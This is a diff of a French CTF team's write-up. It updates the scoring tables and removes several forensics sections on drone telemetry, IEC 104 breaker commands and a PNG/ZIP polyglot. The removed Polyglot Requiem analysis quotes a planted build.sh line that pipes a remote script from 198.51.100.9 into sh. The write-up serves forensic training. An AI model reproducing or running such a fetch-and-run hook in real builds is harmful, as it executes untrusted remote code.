@@ -4,59 +4,58 @@
 
 **Membres :** 0xAr3s-root (AresGn) · Nyx (Nyx03-gbd)
 
-**Résolus :** 44 challenges · 11 834 points (somme des valeurs des challenges au moment de la résolution ; le classement officiel fait foi)
+**Classement final :** 216e place · 10 046 points · 42 résolutions comptabilisées (coût des indices inclus)
 
-Chaque write-up ci-dessous donne la démarche étape par étape, les impasses qui ont compté, et un script de résolution (voir l'annexe) qui recalcule le flag à partir des fichiers fournis. Les flags sont masqués sous la forme `CSCTF{...}`.
+Ce document contient 44 write-ups : les 42 résolutions comptabilisées, plus deux challenges résolus mais non comptabilisés au classement (signalés ci-dessous). Chacun donne la démarche étape par étape, les impasses qui ont compté, et un script de résolution (voir l'annexe) qui recalcule le flag à partir des fichiers fournis. Les flags sont masqués sous la forme `CSCTF{...}`.
 
 ## Résumé
 
-| # | Challenge | Catégorie | Points | Résolutions |
+| # | Challenge | Catégorie | Résolutions | Notes |
 |---|---|---|---|---|
-| 1 | [Operation Dawn: The Command](#operation-dawn-the-command) | Web | 200 | — |
-| 2 | [Switchboard](#switchboard) | Web | 120 | 170 |
-| 3 | [Two-Key Turn](#two-key-turn) | Web | 120 | 194 |
-| 4 | [Phantom Drift](#phantom-drift) | Forensics | 675 | 124 |
-| 5 | [Silent Breaker](#silent-breaker) | Forensics | 369 | 81 |
-| 6 | [Afterimage](#afterimage) | Forensics | 345 | 105 |
-| 7 | [Polyglot Requiem](#polyglot-requiem) | Forensics | 342 | 108 |
-| 8 | [Last Commit](#last-commit) | Forensics | 332 | 118 |
-| 9 | [Dawn Array](#dawn-array) | Forensics | 285 | 99 |
-| 10 | [Ghost in the Historian](#ghost-in-the-historian) | Forensics | 275 | 107 |
-| 11 | [Briefing for One](#briefing-for-one) | Forensics | 270 | 82 |
-| 12 | [Code Red Freight](#code-red-freight) | Forensics | 270 | 102 |
-| 13 | [Interlock Witness](#interlock-witness) | Forensics | 270 | 99 |
-| 14 | [CAPTCHA THE WATER PLANT](#captcha-the-water-plant) | Forensics | 168 | 32 |
-| 15 | [Operation Dawn: Relay Snapshot](#operation-dawn-relay-snapshot) | Forensics | 125 | 42 |
-| 16 | [Capability Ghost](#capability-ghost) | Forensics | 120 | 106 |
-| 17 | [Flotsam](#flotsam) | Forensics | 120 | 100 |
-| 18 | [Last Buffer](#last-buffer) | Forensics | 120 | 119 |
-| 19 | [Night Clerk](#night-clerk) | Forensics | 120 | 45 |
-| 20 | [Operation Dawn: The Burnt Server](#operation-dawn-the-burnt-server) | Forensics | 120 | 61 |
-| 21 | [Operation Dawn: The Relay Tap](#operation-dawn-the-relay-tap) | Forensics | 120 | 36 |
-| 22 | [Redline](#redline) | Forensics | 120 | 127 |
-| 23 | [Signal Reconciliation](#signal-reconciliation) | Forensics | 120 | 51 |
-| 24 | [Tone Burst](#tone-burst) | Forensics | 120 | 113 |
-| 25 | [Grid Watch](#grid-watch) | Réseau | 672 | 75 |
-| 26 | [Ghost Signal](#ghost-signal) | Réseau | 587 | 145 |
-| 27 | [Water Hammer Reconciliation](#water-hammer-reconciliation) | Réseau | 326 | 124 |
-| 28 | [Dark Anchorage Reconciliation](#dark-anchorage-reconciliation) | Réseau | 302 | 101 |
-| 29 | [Hard Landing](#hard-landing) | Réseau | 120 | 86 |
-| 30 | [Radar Silence](#radar-silence) | Réseau | 120 | 158 |
-| 31 | [Severed Link](#severed-link) | Réseau | 120 | 84 |
-| 32 | [Ghost Bank](#ghost-bank) | Reverse / Malware | 856 | 29 |
-| 33 | [HELIOS-RTU](#helios-rtu) | Reverse / Malware | 782 | 52 |
-| 34 | [Carrier Shadow](#carrier-shadow) | Reverse / Malware | 540 | 264 |
-| 35 | [Ground Lock](#ground-lock) | Reverse / Malware | 120 | 163 |
-| 36 | [Operation Dawn: Radio Recovery](#operation-dawn-radio-recovery) | Reverse / Malware | 120 | 156 |
-| 37 | [PoshTerm](#poshterm) | Reverse / Malware | 120 | 126 |
-| 38 | [The Lock Box](#the-lock-box) | Reverse / Malware | 120 | 166 |
-| 39 | [Operation Blackout](#operation-blackout) | ICS / SCADA | 663 | 138 |
-| 40 | [Operation Dawn: The Sentry's Model](#operation-dawn-the-sentrys-model) | ML / IA | 540 | 261 |
-| 41 | [Command Calendar Reconciliation](#command-calendar-reconciliation) | Divers | 120 | 141 |
-| 42 | [Operation Dawn: The Shared Model](#operation-dawn-the-shared-model) | Divers | 120 | 213 |
-| 43 | [The Reconnaissance Plate](#the-reconnaissance-plate) | Divers | 120 | 96 |
-| 44 | [Watch List Audit](#watch-list-audit) | Divers | 120 | 243 |
-| | **Total** | | **11834** | |
+| 1 | [Operation Dawn: The Command](#operation-dawn-the-command) | Web | — |  |
+| 2 | [Switchboard](#switchboard) | Web | 170 | non comptabilisé au classement |
+| 3 | [Two-Key Turn](#two-key-turn) | Web | 194 | non comptabilisé au classement |
+| 4 | [Afterimage](#afterimage) | Forensics | 105 |  |
+| 5 | [Briefing for One](#briefing-for-one) | Forensics | 82 |  |
+| 6 | [Capability Ghost](#capability-ghost) | Forensics | 106 |  |
+| 7 | [CAPTCHA THE WATER PLANT](#captcha-the-water-plant) | Forensics | 32 | indice utilisé |
+| 8 | [Code Red Freight](#code-red-freight) | Forensics | 102 |  |
+| 9 | [Dawn Array](#dawn-array) | Forensics | 99 |  |
+| 10 | [Flotsam](#flotsam) | Forensics | 100 |  |
+| 11 | [Ghost in the Historian](#ghost-in-the-historian) | Forensics | 107 |  |
+| 12 | [Interlock Witness](#interlock-witness) | Forensics | 99 |  |
+| 13 | [Last Buffer](#last-buffer) | Forensics | 119 |  |
+| 14 | [Last Commit](#last-commit) | Forensics | 118 |  |
+| 15 | [Night Clerk](#night-clerk) | Forensics | 45 |  |
+| 16 | [Operation Dawn: Relay Snapshot](#operation-dawn-relay-snapshot) | Forensics | 42 |  |
+| 17 | [Operation Dawn: The Burnt Server](#operation-dawn-the-burnt-server) | Forensics | 61 |  |
+| 18 | [Operation Dawn: The Relay Tap](#operation-dawn-the-relay-tap) | Forensics | 36 |  |
+| 19 | [Phantom Drift](#phantom-drift) | Forensics | 124 |  |
+| 20 | [Polyglot Requiem](#polyglot-requiem) | Forensics | 108 |  |
+| 21 | [Redline](#redline) | Forensics | 127 |  |
+| 22 | [Signal Reconciliation](#signal-reconciliation) | Forensics | 51 |  |
+| 23 | [Silent Breaker](#silent-breaker) | Forensics | 81 |  |
+| 24 | [Tone Burst](#tone-burst) | Forensics | 113 |  |
+| 25 | [Dark Anchorage Reconciliation](#dark-anchorage-reconciliation) | Réseau | 101 | indice utilisé |
+| 26 | [Ghost Signal](#ghost-signal) | Réseau | 145 | indice utilisé |
+| 27 | [Grid Watch](#grid-watch) | Réseau | 75 |  |
+| 28 | [Hard Landing](#hard-landing) | Réseau | 86 |  |
+| 29 | [Radar Silence](#radar-silence) | Réseau | 158 |  |
+| 30 | [Severed Link](#severed-link) | Réseau | 84 |  |
+| 31 | [Water Hammer Reconciliation](#water-hammer-reconciliation) | Réseau | 124 |  |
+| 32 | [Carrier Shadow](#carrier-shadow) | Reverse / Malware | 264 |  |
+| 33 | [Ghost Bank](#ghost-bank) | Reverse / Malware | 29 |  |
+| 34 | [Ground Lock](#ground-lock) | Reverse / Malware | 163 |  |
+| 35 | [HELIOS-RTU](#helios-rtu) | Reverse / Malware | 52 |  |
+| 36 | [Operation Dawn: Radio Recovery](#operation-dawn-radio-recovery) | Reverse / Malware | 156 |  |
+| 37 | [PoshTerm](#poshterm) | Reverse / Malware | 126 |  |
+| 38 | [The Lock Box](#the-lock-box) | Reverse / Malware | 166 |  |
+| 39 | [Operation Blackout](#operation-blackout) | ICS / SCADA | 138 |  |
+| 40 | [Operation Dawn: The Sentry's Model](#operation-dawn-the-sentrys-model) | ML / IA | 261 |  |
+| 41 | [Command Calendar Reconciliation](#command-calendar-reconciliation) | Divers | 141 |  |
+| 42 | [Operation Dawn: The Shared Model](#operation-dawn-the-shared-model) | Divers | 213 |  |
+| 43 | [The Reconnaissance Plate](#the-reconnaissance-plate) | Divers | 96 |  |
+| 44 | [Watch List Audit](#watch-list-audit) | Divers | 243 |  |
 
 ## Méthodologie et usage de l'IA
 
@@ -65,6 +64,7 @@ Chaque write-up ci-dessous donne la démarche étape par étape, les impasses qu
 - **Les preuves d'abord.** Chaque challenge a été résolu à partir des fichiers fournis. Quand plusieurs fichiers décrivent le même fait, nous les avons recoupés avant d'en tirer quoi que ce soit, et traité les contradictions comme de possibles leurres (voir *Operation Blackout*, où chaque champ est vérifié sur des sources indépendantes).
 - **Le script est la preuve.** Chaque write-up est accompagné d'un script qui recalcule le flag à partir des fichiers d'origine ou du service en ligne. Aucun flag n'est écrit en dur : si les preuves changent, le script échoue clairement au lieu d'afficher une mauvaise réponse.
 - **Des notes en direct, échecs compris.** Nous avons noté les commandes, les pistes et les impasses pendant l'événement. Les soumissions refusées sont conservées et expliquées (par exemple les trois tentatives refusées sur *Operation Blackout*, analysées dans sa section « Ce que j'ai appris »).
+- **Indices, déclarés.** Nous avons utilisé des indices de la plateforme sur plusieurs challenges (dont Ghost Signal, Dark Anchorage Reconciliation, CAPTCHA the Water Plant et Key Custody) ; leur coût est inclus dans notre score, et chaque write-up indique si un indice a été utilisé.
 
 ### Usage de l'IA (déclaré)
 
@@ -80,9 +80,9 @@ Nous avons utilisé un assistant de programmation IA (Claude, via Claude Code) p
 
 ### Operation Dawn: The Command
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| web | 200 | — | ✅ | — | 0xAr3s-root | Chronos Security |
+| web | — | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -175,9 +175,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### Switchboard
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| web | 120 | 170 | ✅ | — | 0xAr3s-root | Iulian Schifirnet |
+| web | 170 | ✅ (non comptabilisé) | — | non | 0xAr3s-root | Iulian Schifirnet |
 
 #### Énoncé
 
@@ -360,9 +360,9 @@ python3 solve/solve.py http://w06.ctf.chronos-security.ro:34144
 
 ### Two-Key Turn
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| web | 120 | 194 | ✅ | — | 0xAr3s-root | Chronos Security |
+| web | 194 | ✅ (non comptabilisé) | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -535,148 +535,11 @@ python3 solve/solve.py http://w05.ctf.chronos-security.ro:34125
 
 ## Forensics
 
-### Phantom Drift
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| forensics | 675 | 124 | ✅ | — | 0xAr3s-root | Dragoş Bacitea |
-
-#### Énoncé
-
-> Reconnaissance drone Valkyrie-9 drifted off its approved waypoint while the command server recorded the mission as nominal. Reconcile the recovered client and backend logic with the flight record, telemetry, and radio intercept to show how the diversion avoided the alarm.
->
-> This is a constructed offline forensic case.
->
-> Attachments: `drone_control.decompiled`, `command_backend.decompiled`, `flight_log.bin`, `mission_manifest.json`, `radio_intercept.log`, `telemetry_logs.json`.
->
-> Flag format: `CSCTF{16_lowercase_hex}`
->
-> Flag construction: SHA-256 the concatenated text `<APPROVED_LAT_4DP><APPROVED_LON_4DP><LAT_OFFSET_6DP><LON_OFFSET_6DP><DISTANCE_1DP>` with no separators, then use the first 16 lowercase hex characters. The flight-log tag verifies the last 8 characters of the same digest; it is not an input.
->
-> Flag derivation: `sha256(f"{approved_lat:.4f}{approved_lon:.4f}{delta_lat:.6f}{delta_lon:.6f}{displacement_m:.1f}")[:16]`. `approved_*` = manifest coordinates; `delta_*` = per-axis delta between approved and diverted coordinates, 6 decimals (degrees); `displacement_m` = great-circle distance in meters between approved and diverted points, 1 decimal. The `TAG:` value in `flight_log.bin` matches the last 8 hex of the same sha256.
-
-**Fichiers fournis :** les six fichiers ci-dessus (non commités).
-
-#### En bref
-
-La commande `waypoint_update` contient chaque champ deux fois, en snake_case (l'approuvé 47.2591, 19.0402) et en PascalCase (le détourné 47.2600, 19.0450) ; le backend a validé une graphie et le drone a obéi à l'autre. Le détournement est de 0,000900° / 0,004800° = 376,2 m (rayon WGS84), et le tag du journal de vol sélectionne ce rayon et confirme le condensat → flag.
-
-#### Démarche
-
-**1. Reconnaissance — les deux `.decompiled` sont du code source en base64, le reste est de la preuve**
-
-`drone_control.decompiled` (C#, Unity, Newtonsoft.Json) et `command_backend.decompiled` (Go 1.21) sont un en-tête plus un `DECODED_CONTENT = "<base64>"` ; le décoder donne les sources (lues seulement, rien d'exécuté). Les deux définissent le même `FlightParams` avec les tags JSON `altitude`, `speed`, `waypoint_lat`, `waypoint_lon`, `payload_weight`, `wind_compensation`, et le même validateur : rejet si `|lat − approuvé| > 0,001` ou `|lon − approuvé| > 0,001` (environ 111 m), contre le manifeste codé en dur 47.2591, 19.0402 (mêmes valeurs que `mission_manifest.json`).
-
-Le log radio raconte l'histoire : à 12:30 la station sol 3 voit le drone 380 m à l'est de WP-Bravo, le contrôleur du drone dit que le waypoint a été mis à jour à 47.2600, 19.0450, et le serveur de commande répond « mission nominale, aucune anomalie ». La validation est donc passée pour une commande que le drone a exécutée autrement. (Je traite le « ~47.2600, 19.0450 » de la radio comme une piste et je le confirme dans la télémétrie, pas comme la réponse.)
-
-**2. Hypothèse — une charge utile, deux lectures**
-
-Dans `telemetry_logs.json`, l'enregistrement `waypoint_update` est la commande réelle. Il contient chaque champ deux fois :
-
-```json
-"waypoint_lat": 47.2591, "waypoint_lon": 19.0402, ...
-"WaypointLat": 47.26,    "WaypointLon": 19.045,   ...
-```
-
-Des clés dupliquées/aliasées sont la différentielle de parseurs classique : deux parseurs qui normalisent les noms de clés différemment (casse, underscores, dernier gagnant, correspondance insensible à la casse) voient des valeurs différentes dans les mêmes octets. Ici les valeurs approuvées sont sous la graphie que le validateur accepte (47.2591 → delta 0 → « PASS »), alors que les valeurs détournées (47.2600, 19.0450) sont sous l'autre graphie. Le reste des preuves confirme laquelle le drone a suivie : les fixes GPS de `transit_to_new_waypoint` passent de (47.2591, 19.0402) par (47.26, 19.045) et continuent de dériver vers le NE (47.2627, 19.0594), `waypoints_visited` liste `surveillance_target` à 47.26, 19.045, et `server_validation` dit PASS avec `discrepancy_detected: false` alors que `anomalies_detected` est vide. (Je n'ai exécuté aucun des deux parseurs ; le comportement exact de la bibliothèque n'est pas nécessaire pour le flag, et la note du serveur dans la télémétrie se trompe même sur la valeur lue par Go, donc je m'appuie sur les positions de télémétrie et la radio.)
-
-**3. Exploitation — calculer le flag, laisser le tag choisir le rayon terrestre**
-
-- `delta_lat = 47.2600 − 47.2591 = 0.000900`, `delta_lon = 19.0450 − 19.0402 = 0.004800` (positifs : détourné moins approuvé) ;
-- `displacement_m` par haversine. L'énoncé ne précise pas le rayon terrestre : avec le rayon moyen 6 371 000 m la distance est de 375,8 m ; avec le rayon équatorial WGS84 6 378 137 m elle est de **376,2 m** ;
-- `flight_log.bin` est un en-tête de 24 octets (`FLGT`, version, compteurs) suivi de 12 octets qui sont `TAG:xxxxxxxx` XORés avec l'identifiant de mission `Valkyrie-9` comme clé répétée (trouvée avec le clair connu `TAG:` → clé `Valk…`) : le tag est `dc6836a2`.
-
-Seule la variante 376,2 m donne un SHA-256 dont les 8 derniers caractères hexa sont `dc6836a2` ; celle à 375,8 m finit par `2126c52e`, et les variantes à deltas négatifs ne correspondent pas non plus. Le tag valide donc à la fois le rayon et la convention de signe, et les 16 premiers caractères hexa de ce condensat sont le flag.
-
-```bash
-python3 -I solve/solve.py files
-```
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`CSCTF{...}` (masqué)
-
-#### Réflexions
-
-- Deux composants qui « parsent le même JSON » ne lisent pas forcément la même valeur : des alias de clés (variantes de casse, doublons) suffisent à faire diverger un validateur et un exécutant, et un contrôle de signature ou de tolérance sur une lecture ne dit rien de l'autre.
-- Lire toute la chaîne de preuves : la trace GPS de télémétrie, le résumé des waypoints visités et le log radio s'accordent sur le point détourné, ce dont le flag a besoin ; le « PASS » du serveur n'est que la vue du validateur.
-- Le tag de vérification du journal de vol n'est pas qu'un contrôle : avec une formule sous-spécifiée (rayon terrestre, signe du delta), c'est l'oracle qui sélectionne la bonne variante.
-- Le clair connu (`TAG:`) a trouvé la clé XOR sans rien deviner sur sa longueur.
-
-#### Outils & références
-
-- Python 3 (`json`, `base64`, `math`, `hashlib`)
-- Différentielles de parseurs / problèmes d'interopérabilité JSON, distance haversine, rayon équatorial WGS84
-
-
-### Silent Breaker
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| forensics | 369 | 81 | ✅ | — | 0xAr3s-root | Dan-Andrei Grigorescu |
-
-#### Énoncé
-
-> A regional substation breaker tripped without warning. You have console access to Velkarion Mobile's signaling investigation tool and a forensic bundle from the substation's IEC 60870-5-104 network. Reconstruct what happened and who is responsible.
->
-> Endpoint: GET /events for the flagged-signaling feed; start at GET /files/ for the case-file index and report contract; submit the completed report to POST /submit.
->
-> Flag format: `CSCTF{...}`
-
-**Fichiers fournis :** téléchargés depuis l'index `/files/` de l'instance : `README.md` (contrat du rapport), `description.md`, `roster.json`, `iec104_capture.pcap`, `hmi_monitoring.log` (non commités). Instance live `http://w01.ctf.chronos-security.ro:39328` (durée de vie 30 minutes, expirée) ; chaque lancement est un cas différent avec des données différentes.
-
-#### En bref
-
-Croiser les événements de signalisation d'un GT non légitime avec l'annuaire du personnel pour trouver l'employé ayant un accès VPN OT, lire la commande `ON` du disjoncteur (IOA, qualificatif, heure sur le fil) dans le pcap IEC 104, prendre le courant figé du run `QUALITY=SUSPECT` du journal historian, et soumettre ces cinq valeurs avec l'id de session VPN de l'employé ; le service renvoie le flag en `clearance_code`.
-
-#### Démarche
-
-**1. Reconnaissance — lire le contrat avant de toucher à la console**
-
-`GET /files/` liste les fichiers du cas et un contrat (`/files/README.md`) qui définit tout : `/events` (gratuit), `/query/subscriber` et `/query/vpn-window` (budgétés), `POST /confirm-target` (**2 tentatives**, la bonne cible débloque la route VPN) et `POST /submit` (**5 rapports complets**, réponse réussite/échec seulement). Le rapport a cinq champs : `ioa_address`, `command_qualifier`, `command_time_utc` (heure sur le fil, pas début du VPN), `telemetry_status` (courant figé du run suspect) et `vpn_session_id`. Les tentatives étant rares, chaque valeur doit être dérivée hors ligne avant de soumettre.
-
-**2. Hypothèse — quatre sources indépendantes donnent les cinq champs**
-
-- **Qui** : `/events` précise que tout GT hors `GT-0000..GT-0999` n'est pas un pair légitime. Six événements viennent de `GT-7779-Q22` (UpdateLocation / SendRoutingInfoForSM) pour six MSISDN. En les croisant avec `roster.json` : seule **Sanda Ionescu, `VLK-1944-ION`, OT Field Engineering**, a `ot_vpn_access: true` ; les autres (Finance, RH, Juridique, Service client) ne peuvent pas accéder au VPN OT. Deux requêtes `/query/subscriber` ont confirmé que les deux numéros essayés étaient sur liste de surveillance (budget 8).
-- **Ce qui a été envoyé** : dans le pcap (TCP 2404), parmi les rapports réguliers `M_ME_NC_1` (type 13, IOA `0x21fb`), une trame va dans l'autre sens, maître → RTU, à 08:55:36 UTC : `68 0e … 2d 01 06 00 01 00 fb 21 00 01` = type 45 `C_SC_NA_1` (commande simple), COT 6 (activation), octets IOA `fb 21 00` = **0x21fb**, SCO `01` = **ON** ; le RTU répond avec COT 7 (confirmation d'activation) à la même seconde. L'heure de commande est donc **08:55** (le rapport veut `HH:MM`).
-- **Courant falsifié** : `hmi_monitoring.log` montre des lectures normales d'environ 452–455 A (±1,5 A), puis dès 08:54:40 une valeur constante **426,0 A** que l'historian marque `QUALITY=SUSPECT` de 08:55:00 à 08:57:30 (les deux premières lectures identiques restent `GOOD` car la règle exige trois). Sur le fil, les lectures propres du RTU continuent de varier et reviennent vers 453 A : 426,0 A est donc un enregistrement figé/rejoué de l'historian, pas une valeur live : `telemetry_status = 426.0`.
-- **Quelle session** : donnée seulement après un `/confirm-target` correct.
-
-**3. Exploitation — confirmer la cible, obtenir la session, soumettre**
-
-```bash
-python3 -I solve/solve.py http://<cible>            # dérive et affiche le rapport (GET seulement)
-python3 -I solve/solve.py http://<cible> --submit   # confirm-target + vpn-window + submit
-```
-
-`/confirm-target {"employee_id":"VLK-1944-ION"}` a renvoyé `confirmed`, et `/query/vpn-window` a listé cinq sessions ; celle de `VLK-1944-ION` est `VPN-914973` (Access-Accept à 08:21:41 avec un challenge OTP, IP source `203.0.113.197`). C'est une session différente de celles ouvertes à 08:55 ou plus tard par d'autres utilisateurs, qui sont des leurres rapprochés de la commande. Le premier rapport complet a été accepté (4 tentatives restantes) et a renvoyé le flag.
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`CSCTF{...}` (masqué)
-
-#### Réflexions
-
-- Lire le contrat d'abord : avec 2 et 5 tentatives, dériver les réponses hors ligne depuis les preuves est tout le jeu ; aucune devinette n'a été nécessaire.
-- Ne pas prendre la session VPN qui commence au plus près de la commande ; le rapport demande la session de l'employé compromis, dont le début est antérieur (l'énoncé dit « heure sur le fil de la commande, pas début de session VPN »).
-- Un marqueur `SUSPECT` côté historian vit dans le journal, pas sur le fil : le pcap montre que le RTU a continué à remonter des valeurs live, ce qui prouve que les 426,0 A affichés étaient figés.
-- Le script dérive chaque champ des fichiers de l'instance, car un relancement donne un nouveau cas.
-
-#### Outils & références
-
-- `curl`, `tshark` (pour lister les trames), Python 3 (`urllib`, `struct`, parsing pcap maison)
-- ASDU IEC 60870-5-104 / IEC 60870-5-101 : types 13 (`M_ME_NC_1`) et 45 (`C_SC_NA_1`), causes de transmission 6/7
-
-
 ### Afterimage
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 345 | 105 | ✅ | — | 0xAr3s-root | Chronos Security |
+| forensics | 105 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -738,326 +601,11 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Structure des chunks et filtres PNG, structure des blocs zlib/deflate, aCropalypse (CVE-2023-21036)
 
 
-### Polyglot Requiem
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| forensics | 342 | 108 | ✅ | — | 0xAr3s-root | Mohamed Amine Mzoughi |
-
-#### Énoncé
-
-> A review of a ground-station software supply chain turned up altered build history and an odd dashboard asset. The station works for the Operation Dawn coalition, which puts its builds high on the Ash Army's target list.
->
-> Recover the concealed marker from the retained repository and submit the complete `CSCTF{...}` value. Inspect build scripts, hooks and recovered programs as data: do not run them, and do not contact addresses found in the evidence. The exercise is constructed and the organizations are fictional. Attachment: `polyglot-requiem.zip`, 39,051 bytes, SHA-256 `2a3aeda4fcc7fab03a268130a22b31b2194ed45f74981146ae765d78c97813c9`.
->
-> Flag format: `CSCTF{...}`
-
-**Fichiers fournis :** `files/flight-telemetry-sdk/` (un dépôt git avec son `.git`), `files/README_FOR_RESPONDERS.md`, `files/manifest.sha256` (non commités).
-
-#### En bref
-
-`assets/telemetry_icon.png` est un polyglotte PNG/ZIP : un chunk `tEXt` porte un tag de provenance, et le ZIP ajouté contient un fichier SQLite avec une ligne `ci_provenance_seal` *supprimée* et l'outil de scellement `assetsignd` ; l'analyse statique de cet outil donne le schéma (XOR à clé répétée avec `SHA-256(inverse(tag) ‖ epoch_le64)`) et le timestamp des commits est l'epoch → flag.
-
-#### Démarche
-
-**1. Reconnaissance — un dépôt avec un commit orphelin et une icône suspecte**
-
-J'ai travaillé sur une copie du dépôt et n'ai jamais lancé `build.sh` ni un hook. `git log --all` montre cinq commits ordinaires, tous au même timestamp (1792061626). `git fsck --lost-found --unreachable` trouve un commit inatteignable, `c435f88` « build: add telemetry opt-in check » (il est aussi dans `.git/ORIG_HEAD`) : son `build.sh` fait `curl -s http://198.51.100.9/telemetry-opt-in.sh | sh` — « l'historique de build altéré » qui a été écarté par un reset. Je n'ai pas contacté l'adresse ; c'est une diversion par rapport au marqueur.
-
-L'autre piste est l'icône ajoutée dans `92d3ba9` et référencée dans le README : `assets/telemetry_icon.png` fait 23 008 octets pour une image 10×10. `binwalk` signale un PNG, puis un ZIP à 0x72.
-
-**2. Hypothèse — un polyglotte PNG/ZIP avec un secret supprimé**
-
-En parcourant les chunks PNG à la main : `IHDR`, un chunk `tEXt` `Provenance` = `0f18e37122ddbcca` (8 octets en hexa, le « tag »), un minuscule `IDAT`, `IEND` ; puis 22 894 octets en trop qui commencent par `PK\x03\x04`. Extrait (stocké, sans compression), le ZIP a deux membres :
-
-- `telemetry_cache.db` : SQLite, table `build_secrets` avec des jetons manifestement faux (`AKIADEMOFAKE…`, `npm_fake…`) — leurres ;
-- `assetsignd` : un ELF dont l'usage est `assetsignd <provenance_tag_hex> <epoch> <infile> <outfile>`.
-
-`strings` sur la base montre une ligne que `.dump` n'affiche pas : `ci_provenance_seal` suivie de 36 octets à forte entropie. Elle a été supprimée (la cellule est encore dans le corps de la page, espace non alloué) donc SQLite ne la renvoie pas. L'en-tête de l'enregistrement avant le libellé donne la longueur du blob (type sériel `0x54` → 36 octets). Un chiffré, un tag, une epoch et un outil qui prend exactement ces entrées : l'outil scelle la donnée.
-
-**3. Exploitation — inverser le scellement statiquement, puis recalculer la clé**
-
-Je n'ai pas exécuté `assetsignd`. Son désassemblage (`objdump`/`r2`) montre : les constantes SHA-256 en ligne (aucun import libcrypto), `strtoull(argv[2])` pour l'epoch, `sscanf("%02x")` pour parser le tag en octets, **une inversion des octets du tag**, l'epoch ajoutée en **8 octets little-endian**, un SHA-256 sur ce message, et enfin `out[i] = in[i] ^ digest[i & 0x1f]`. Donc :
-
-```text
-key = SHA-256( inverse(tag_bytes) || epoch_le64 );  clair[i] = chiffré[i] XOR key[i mod 32]
-```
-
-Pour l'epoch, le candidat évident est le timestamp du dépôt, 1792061626 (l'en-tête daté, l'index git et les entrées du ZIP concordent). J'ai d'abord essayé la variante `HMAC-SHA256` d'un outil similaire d'un autre challenge, sans résultat ; j'ai ensuite brute-forcé l'epoch autour de l'heure des commits contre le préfixe connu `CSCTF{` (6 octets de clé), ce qui a confirmé tout de suite le schéma SHA-256 à tag inversé pour exactement 1792061626. Déchiffrer les 36 octets donne le flag.
-
-```bash
-python3 -I solve/solve.py files/flight-telemetry-sdk
-```
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`CSCTF{...}` (masqué)
-
-#### Réflexions
-
-- Les sorties d'outils cachent les données supprimées : `.dump` et les requêtes SQLite ignorent les cellules supprimées, `strings`/hexa brut sur le fichier non.
-- Une image peut porter une archive entière après `IEND` ; parcourir les chunks et regarder les octets en trop est plus rapide que se fier à l'extension.
-- Un binaire documenté seulement par sa ligne d'usage se comprend statiquement : les constantes (table K de SHA-256), les boucles (inversion d'octets, epoch sur 8 octets) et le XOR final ont suffi, sans l'exécuter.
-- Le préfixe en clair connu `CSCTF{` transforme un paramètre incertain (l'epoch) en brute force bon marché et valide tout le schéma.
-- Le commit orphelin avec `curl | sh` est l'« histoire » du scénario, pas le marqueur : le noter sans toucher à l'adresse est la bonne manipulation.
-
-#### Outils & références
-
-- `git` (`log --all`, `fsck --lost-found`, `cat-file`), `binwalk`, `strings`, `objdump`, `radare2`
-- Python 3 (`struct`, `zipfile`, `hashlib`)
-- Structure des chunks PNG, données ajoutées à un ZIP, format d'enregistrement SQLite (types sériels)
-
-
-### Last Commit
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| forensics | 332 | 118 | ✅ | — | 0xAr3s-root | Chronos Security |
-
-#### Énoncé
-
-> The national land registry of one of Operation Dawn's smaller coalition states looks normal again, but its completed restoration export `LR-731` may have carried altered ownership out to regional offices. A later clean view does not prove what the job delivered.
->
-> Reconstruct the exact ownership export at the job's transition to `COMPLETED`, using the acquired SQLite database and WAL pair, the delivery receipt and the supplied export profile. The registry is fictional. Analyze the supplied files only. Attachment: `last-commit.zip`, 84,979 bytes, SHA-256 `06da868e7ceeef1c96651cf1307033f7b37b65e235f8a121ea599166f85279a1`.
->
-> Submit `CSCTF{last_commit_<64 lowercase hex characters>}` as specified in the supplied export profile.
->
-> Flag format: `CSCTF{...}`
-
-**Fichiers fournis :** `files/registry.sqlite`, `files/registry.sqlite-wal`, `files/delivery.csv`, `files/export-profile.md`, `files/provenance.json`, `files/README.txt`, `files/SHA256SUMS` (non commités).
-
-#### En bref
-
-Le WAL contient 9 frames valides en 6 commits ; le commit où `LR-731` passe de `QUEUED` à `COMPLETED` montre des lignes de propriété altérées que les commits suivants (et la base checkpointée) n'ont plus. Reconstruire le registre à ce commit, exécuter la requête du profil avec `delivery.csv` comme manifeste et hacher le TSV en SHA-256 donne le flag.
-
-#### Démarche
-
-**1. Reconnaissance — lire le contrat, pas seulement les données**
-
